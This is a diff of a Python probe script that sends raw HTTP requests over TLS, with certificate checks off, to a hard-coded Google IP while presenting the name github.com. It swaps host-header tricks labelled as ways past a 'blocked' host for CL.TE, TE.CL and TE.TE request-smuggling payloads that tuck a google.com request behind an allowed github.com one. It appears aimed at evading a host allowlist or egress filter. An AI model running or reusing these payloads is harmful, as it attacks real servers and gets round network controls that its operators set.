@@ -5,26 +5,32 @@ context = ssl.create_default_context()
 context.check_hostname = False
 context.verify_mode = ssl.CERT_NONE
 
+# Test 1: CL.TE desync (Content-Length vs Transfer-Encoding)
+# Front-end uses Content-Length, back-end uses Transfer-Encoding
+req1 = b'POST / HTTP/1.1\r\nHost: github.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET http://google.com/ HTTP/1.1\r\nHost: google.com\r\n\r\n'
+
+# Test 2: TE.CL desync
+# Front-end uses Transfer-Encoding, back-end uses Content-Length
+req2 = b'POST / HTTP/1.1\r\nHost: github.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nG\r\n0\r\n\r\n'
+
+# Test 3: TE.TE (obfuscated Transfer-Encoding)
+req3 = b'POST / HTTP/1.1\r\nHost: github.com\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: google.com\r\n\r\n'
+
 tests = [
-    ('Space-prefixed Host', b'GET / HTTP/1.1\\r\\n Host: github.com\\r\\n\\r\\n'),
-    ('Tab-prefixed Host', b'GET / HTTP/1.1\\r\\n\\tHost: github.com\\r\\n\\r\\n'),
-    ('Duplicate Host (first blocked, second allowed)', b'GET / HTTP/1.1\\r\\nHost: google.com\\r\\nHost: github.com\\r\\n\\r\\n'),
-    ('Host with null', b'GET / HTTP/1.1\\r\\nHost: github.com\\x00google.com\\r\\n\\r\\n'),
-    ('Host with port 80', b'GET / HTTP/1.1\\r\\nHost: github.com:80\\r\\n\\r\\n'),
-    ('Absolute URI with blocked host', b'GET http://google.com/ HTTP/1.1\\r\\nHost: github.com\\r\\n\\r\\n'),
-    ('HTTP/1.0 no Host', b'GET / HTTP/1.0\\r\\n\\r\\n'),
-    ('Line-folded Host', b'GET / HTTP/1.1\\r\\nHost: github\\r\\n .com\\r\\n\\r\\n'),
+    ('CL.TE desync', req1),
+    ('TE.CL desync', req2),
+    ('TE.TE obfuscated', req3),
 ]
 
 for name, req in tests:
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(3)
+        s.settimeout(5)
         s.connect(('142.250.80.46', 443))
         ss = context.wrap_socket(s, server_hostname='github.com')
         ss.send(req)
-        data = ss.recv(512)
-        status = data.split(b'\\r\\n')[0].decode('ascii', errors='replace')
+        data = ss.recv(1024)
+        status = data.split(b'\r\n')[0].decode('ascii', errors='replace')
         print(f'{name}: {status}')
         ss.close()
     except Exception as e:
